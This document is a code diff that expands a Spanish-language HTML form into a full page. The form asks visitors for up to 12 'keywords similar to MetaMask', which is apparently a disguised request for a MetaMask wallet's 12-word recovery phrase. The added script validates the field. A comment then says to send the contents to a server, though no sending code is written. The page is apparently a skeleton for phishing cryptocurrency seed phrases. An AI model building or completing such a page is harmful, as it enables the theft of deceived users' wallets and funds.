@@ -1,6 +1,40 @@
-<form>
-  <label for="keywords">Ingresa las palabras clave similares a MetaMask (máximo 12):</label>
-  <textarea id="keywords" name="keywords" rows="4" cols="50"></textarea>
-  <br>
-  <button type="submit">Enviar</button>
-</form>
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Formulario de Palabras Clave</title>
+  </head>
+  <body>
+    <form>
+      <label for="keywords">Ingresa las palabras clave similares a MetaMask (máximo 12):</label>
+      <textarea id="keywords" name="keywords" rows="4" cols="50"></textarea>
+      <br>
+      <button type="submit">Enviar</button>
+    </form>
+    <script>
+      // obteniendo el boton
+      const submitButton = document.querySelector("button[type='submit']");
+
+      // agregando un evento al boton
+      submitButton.addEventListener("click", (event) => {
+        // prevenir el comportamiento por defecto del boton
+        event.preventDefault();
+
+        // obteniendo el campo de texto
+        const keywordsField = document.querySelector("#keywords");
+
+        // obteniendo el contenido del campo
+        const keywords = keywordsField.value;
+
+        // validando contenido
+        if (keywords.length === 0) {
+          alert("por favor ingresa las palabras clave");
+          return;
+        }
+
+        // aqui puedes enviar el contenido del campo de texto a tu servidor
+        // utilizando alguna librería de comunicación con el servidor como Fetch o Axios
+      });
+    </script>
+  </body>
+</html>
